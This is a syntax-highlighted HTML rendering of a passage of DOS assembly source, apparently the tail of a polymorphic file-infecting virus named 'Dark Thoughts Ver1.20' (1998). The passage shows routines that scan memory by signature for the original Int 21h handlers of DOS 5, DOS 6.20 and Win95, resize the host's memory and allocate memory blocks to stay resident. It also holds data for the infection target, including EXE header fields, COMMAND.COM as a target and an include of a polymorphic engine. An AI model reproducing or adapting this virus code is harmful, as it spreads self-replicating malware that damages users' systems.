</span><span class="sc5">target2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\WINDOWS\COMMAND.COM"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;______________________________________________________________</span><span class="sc0">







 

</span><span class="sc1">;_______________________________________________________________</span><span class="sc0">
</span><span class="sc1">;Scan memory for original Int 21h handlers.</span><span class="sc0">
</span><span class="sc1">;It doesn't use tunneling because i dont want to waste Kbytes for</span><span class="sc0">
</span><span class="sc1">;a good one. I use Signatures instead. YES, SIGNATURES!!!</span><span class="sc0">
</span><span class="sc1">;This trick seems to work till microsoft release its first polymorphic  </span><span class="sc0">
</span><span class="sc1">;Interrupt handler! </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Scan Engine V1.0b</span><span class="sc0">
</span><span class="sc1">;This Version of Scan21 can detect the location of the folowing Int21s: </span><span class="sc0">
</span><span class="sc1">;Microsoft.Dos.Int21h.V5.00        </span><span class="sc0">
</span><span class="sc1">;Microsoft.Dos.Int21h.V6.20</span><span class="sc0">
</span><span class="sc1">;Microsoft.Dos.Int21h.Win95</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Microsoft.Int21h.Win95 reported to be "on the wild"! </span><span class="sc0">
</span><span class="sc1">;_______________________________________________________________</span><span class="sc0">
</span><span class="sc5">scan21</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">        </span><span class="sc1">; get int21 address by using vector table</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; do it!</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">adr21</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">   </span><span class="sc1">; and save it to [adr21]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">adr21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">orig_adr21</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">   </span><span class="sc1">; ...and to [orig_adr21] in case we can't </span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">orig_adr21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0"> </span><span class="sc1">; find original int21h</span><span class="sc0">

</span><span class="sc1">;try to find the original int 21h of DOS v5.00,v6.20 and WIN95</span><span class="sc0">

</span><span class="sc5">Dos5</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;dos 5.00</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">40EBh</span><span class="sc0">
</span><span class="sc5">Dos5lp</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Dos62</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">80FAh</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Dos5lp</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">6CFCh</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Dos5lp</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0D277h</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Dos5lp</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">found_21</span><span class="sc0">
    
</span><span class="sc5">Dos62</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;dos 6.20</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">40F8h</span><span class="sc0">
</span><span class="sc5">Dos62lp</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Win95</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">80FAh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Dos62lp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">6CFCh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Dos62lp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0D277h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Dos62lp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">0FC80h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Dos62lp</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">found_21</span><span class="sc0">


</span><span class="sc5">Win95</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;Win95</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">04A0h</span><span class="sc0">
</span><span class="sc5">Win95lp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoFound</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">0F62Eh</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Win95lp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc2">3506h</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Win95lp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc2">0200h</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Win95lp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc2">02074h</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Win95lp</span><span class="sc0">
       </span><span class="sc1">;jmp found_21  ;no need to do that.</span><span class="sc0">

</span><span class="sc5">found_21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">orig_adr21</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">          
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">orig_adr21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">        
</span><span class="sc5">NoFound</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------</span><span class="sc0">






</span><span class="sc1">;________________________________________________________________</span><span class="sc0">
</span><span class="sc1">;Resize host and allocate memory</span><span class="sc0">
</span><span class="sc1">;input: bx=paragraphs of neaded memory</span><span class="sc0">
</span><span class="sc1">;output: ds=segment of memory</span><span class="sc0">
</span><span class="sc1">;        carry set=no memmory</span><span class="sc0">
</span><span class="sc1">;________________________________________________________________</span><span class="sc0">
</span><span class="sc5">alloc_mem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc1">;resize host's memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">datasegm</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ah</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">    
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
      </span><span class="sc6">pushf</span><span class="sc0">
    
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">alloc_end</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">alloc_end</span><span class="sc4">:</span><span class="sc0">
    
      </span><span class="sc6">popf</span><span class="sc0">
    
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">  
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;_______________________________________________________________</span><span class="sc0">






</span><span class="sc1">;________________________________________________________________</span><span class="sc0">
</span><span class="sc1">;allocate UMB</span><span class="sc0">
</span><span class="sc1">; input: bx=paragraphs of needed memory </span><span class="sc0">
</span><span class="sc1">;output: carry=0 / ds=segment of memory</span><span class="sc0">
</span><span class="sc1">;        carry set=no memory </span><span class="sc0">
</span><span class="sc1">;________________________________________________________________</span><span class="sc0">
</span><span class="sc5">alloc_UMB</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc1">;inclusion of UMB </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05803h</span><span class="sc0">   
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc1">;search from the end of memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5801h</span><span class="sc0">    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc1">;allocate BX paragraphs         </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">             
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">       
      
      </span><span class="sc6">pushf</span><span class="sc0">  </span><span class="sc1">;save the Carry flag </span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc1">;save the segment adress of memory block  </span><span class="sc0">
    
</span><span class="sc1">;no more UMB</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05803h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc1">;search from the start of memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5801h</span><span class="sc0">         
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> 
      </span><span class="sc6">popf</span><span class="sc0">

    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">End_AllocUMB</span><span class="sc0">  </span><span class="sc1">;no memory?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A000h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">End_AllocUMB</span><span class="sc0">  </span><span class="sc1">;that's not in Upper Memory!</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; pass segment adress to DS     </span><span class="sc0">

</span><span class="sc5">End_AllocUMB</span><span class="sc4">:</span><span class="sc0">   
      
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">  
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;_______________________________________________________________</span><span class="sc0">




</span><span class="sc1">;________________________________________________________________</span><span class="sc0">
</span><span class="sc1">;Poly-engine</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">enthelec.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">splVM.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">splrand.inc</span><span class="sc0">
</span><span class="sc1">;________________________________________________________________</span><span class="sc0">




</span><span class="sc1">;__________________________________________________________________</span><span class="sc0">
</span><span class="sc1">;data , data , data...</span><span class="sc0">

</span><span class="sc1">;parametre block for EXEC (4Bh/Int21h)</span><span class="sc0">
</span><span class="sc5">envir</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;segment of the enviroment</span><span class="sc0">
</span><span class="sc5">line</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; command line offset</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;    &gt;&gt;    &gt;&gt;  segment</span><span class="sc0">
</span><span class="sc5">FCB1</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">5Ch</span><span class="sc0"> </span><span class="sc1">; 1st FCB offset</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;  &gt;&gt;  &gt;&gt; segment</span><span class="sc0">
</span><span class="sc5">FCB2</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">6Ch</span><span class="sc0"> </span><span class="sc1">; 2nd FCB offset</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;  &gt;&gt;  &gt;&gt; segment</span><span class="sc0">

</span><span class="sc1">;general infos about the file to be infected</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">atrib</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">date</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">size1</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">headersize</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;keep here the entry-point of the host program</span><span class="sc0">
</span><span class="sc5">entry</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000</span><span class="sc4">,</span><span class="sc2">0016</span><span class="sc0"> </span><span class="sc1">; first time return to PSP:0  (INT 20h) </span><span class="sc0">
</span><span class="sc5">entrybackup</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0"> </span><span class="sc1">;back up here the [entry] data</span><span class="sc0">

</span><span class="sc1">;segment of the buffer.</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;where PSP is.</span><span class="sc0">
</span><span class="sc5">datasegm</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;SS:SP before calling the POLY</span><span class="sc0">
</span><span class="sc5">oldSS</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc5">oldSP</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;file handler</span><span class="sc0">
</span><span class="sc5">handler</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;header structure</span><span class="sc0">
</span><span class="sc5">header</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">filesizeMOD</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">filesizeDIV</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  
</span><span class="sc5">hdrsize</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">minmem</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maxmem</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">stackSS</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">stackSP</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">checksum</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">initIP</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">codeCS</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">relocadr</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">reloctable</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> 


</span><span class="sc1">;vectors of interrupt21</span><span class="sc0">
</span><span class="sc5">orig_adr21</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">adr21</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  
</span><span class="sc5">adr13</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;Virus Message</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Dark Thoughts Ve"</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"r1.20 - EuR(c)98"</span><span class="sc0">          
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" by ANAkTAS.    "</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Using ENTHELECHIA v1.0 "</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Poly-Engine made with SPL."</span><span class="sc0">
         </span><span class="sc1">;0123456789ABCDEF </span><span class="sc0">


</span><span class="sc5">endofvirusbody</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">
     </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">VIRUS_V</span><span class="sc0">                                                           
</span><span class="sc1">;________________________________________________________________</span><span class="sc0">




</span></div></body>
</html>
